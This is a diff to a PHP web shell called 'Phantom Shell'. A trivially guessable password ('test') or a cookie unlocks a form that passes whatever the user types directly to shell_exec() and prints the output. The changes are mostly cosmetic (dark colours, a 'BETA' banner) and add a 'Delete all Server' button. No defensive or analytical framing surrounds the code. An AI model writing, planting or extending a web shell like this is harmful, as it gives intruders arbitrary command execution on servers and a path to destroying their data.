@@ -24,30 +24,39 @@ if($_POST['password'] == 'test' || $_COOKIE['Shell'] == true):
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Phantom Shell</title>
 </head>
-<body style="background-color: #191919;">
+<body style="background-color: #0D1117;">
 <center>
-    <pre style="color : #1ec81e; font-size: 25px;">
+    <pre style="color : #1ec81e; font-size: 20px;">
     
      ____  _                 _                    ____  _          _ _ 
     |  _ \| |__   __ _ _ __ | |_ ___  _ __ ___   / ___|| |__   ___| | |
     | |_) | &apos;_ \ / _` | &apos;_ \| __/ _ \| &apos;_ ` _ \  \___ \| &apos;_ \ / _ \ | |
     |  __/| | | | (_| | | | | || (_) | | | | | |  ___) | | | |  __/ | |
     |_|   |_| |_|\__,_|_| |_|\__\___/|_| |_| |_| |____/|_| |_|\___|_|_|
-          
+
+ ____  _____ _____  _    
+| __ )| ____|_   _|/ \   
+|  _ \|  _|   | | / _ \  
+| |_) | |___  | |/ ___ \ 
+|____/|_____| |_/_/   \_\
+                         
+
     
+  <input style="padding: 3px; background-color: rgba(0, 0, 0, 0); border-radius: 7px; border-color: #232930; color : red; font-size: 25px" type="button" value="Delete all Server">
+
     </pre>
 </center>
 <br />
 
 <form method="POST">
-<label style="color : #f96e0a; font-size: 25px;"><?php echo $dir; ?> : </label><input style="font-size : 24px; color: #ff0004; background-color : rgba(0, 0, 0, 0); border-color: rgba(0, 0, 0, 0); " type="text" name="query" />
+<label style="color : #1ec81e; font-size: 25px;"><?php echo $dir; ?> : </label><input style="font-size : 24px; color: #C3CBD9; background-color : rgba(0, 0, 0, 0); border-color: rgba(0, 0, 0, 0); " type="text" name="query" />
 </from>
 
 <?php
 
 $command = shell_exec($_POST['query']);
 
-echo '<pre style="color: white; margin-top: 20px; color: white;">'.$command.'</pre>';
+echo '<pre style="color: #C3CBD9; margin-top: 20px; color: white; background-color: #232930; padding: 25px; font-size: 20px; ">'.$command.'</pre>';
 
 ?>
 
